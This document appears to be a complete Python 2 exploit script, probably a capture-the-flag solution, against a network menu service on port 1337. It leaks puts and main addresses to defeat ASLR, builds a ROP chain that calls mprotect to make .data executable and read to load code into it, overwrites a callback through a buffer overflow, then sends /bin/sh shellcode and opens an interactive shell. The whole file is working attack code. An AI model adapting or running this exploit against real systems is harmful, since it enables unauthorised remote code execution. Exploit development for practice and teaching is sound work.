#!/usr/bin/env python

import telnetlib
import struct
import re
from time import sleep

# /bin/sh
sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

def p(a):
    return struct.pack('<I', a)

host = 'ubuntu.vm'
port = 1337

trigger = 200

XCHG_OFFSET = 0x78d
MAIN_OFFSET = 0x806
DATA_OFFSET = 0x2040

PUTS_OFFSET = 0x00062b30
MPROTECT_OFFSET = 0x000e5d60
READ_OFFSET = 0x000d9bf0
POP3_OFFSET = 0x001372db

conn = telnetlib.Telnet(host, port)
s = conn.get_socket()
conn.read_until("your input: ")

# leaking puts address
s.send("3")
data = conn.read_until("your input: ")
data = data.split("Make your choice:\n")[0]
s1 = (data.split("main : ")[0]).split("puts : ")[1]
PUTS = int(s1[:-1], 16)
MAIN = int(data.split("main : ")[1][:-1], 16)
LIBC_BASE = PUTS - PUTS_OFFSET
BIN_BASE = MAIN - MAIN_OFFSET
DATA = BIN_BASE + DATA_OFFSET

print "[+] leaked puts: " + hex(PUTS)
print "[+] leaked main: " + hex(MAIN)
print "[+] calc  .data: " + hex(DATA)
print "[+] calc  mprot: " + hex(LIBC_BASE + MPROTECT_OFFSET)

# ropchain
rop = p(LIBC_BASE + MPROTECT_OFFSET) # mprotect;
rop += p(LIBC_BASE + POP3_OFFSET) # pop esi ; pop edi ; pop ebx ; ret
rop += p(DATA - (DATA % 4096)) # .data
rop += p(DATA % 4096 + 200) # size
rop += p(0x7) # RWX
rop += p(LIBC_BASE + READ_OFFSET) # read
rop += p(DATA) # jmp to .data
rop += p(0) # fd
rop += p(DATA) # .data
rop += p(0xc8) # size

# overwriting callback
s.send("1")
data = rop + (trigger - len(rop)) * "A"
print len(rop)
data += p(BIN_BASE + XCHG_OFFSET)

s.send(data)
conn.read_until("your input: ")
s.send("2")
sleep(3)
s.send(sc)
conn.interact()
